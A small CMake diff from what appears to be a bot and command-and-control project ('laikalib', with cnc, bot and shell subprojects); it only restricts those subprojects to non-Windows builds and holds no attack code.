@@ -41,6 +41,10 @@ add_subdirectory(cmake-modules/libsodium)
 # compile laikalib, tools, cnc & bot
 add_subdirectory(lib)
 add_subdirectory(tools)
-add_subdirectory(cnc)
-add_subdirectory(bot)
-add_subdirectory(shell)
+
+# these subprojects don't support windows (sorry)
+if(NOT WIN32)
+  add_subdirectory(bot) # windows support Soon:tm:
+  add_subdirectory(cnc)
+  add_subdirectory(shell)
+endif()
